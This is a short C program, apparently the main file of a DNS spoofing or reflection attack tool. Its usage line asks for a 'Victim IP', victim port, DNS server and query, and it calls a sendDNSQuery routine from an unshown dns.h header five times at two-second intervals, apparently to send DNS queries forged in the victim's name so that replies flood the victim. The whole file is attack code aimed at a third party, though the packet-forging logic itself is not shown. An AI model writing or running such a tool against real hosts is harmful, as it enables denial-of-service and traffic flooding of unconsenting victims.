#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "dns.h"
int main(int argc, char **argv) {
	if (argc < 5) {
		printf("Usage: %s <Victim IP> <Victim Port> <DNS server IP> <DNS Query>\n", argv[0]);
		exit(-1);
	}
	for (int i = 0 ; i < 5 ; i++) {
		sendDNSQuery(argv[1], atoi(argv[2]), argv[3], 53, argv[4]);
		sleep(2);
	}
	printf ("done.\n");
}
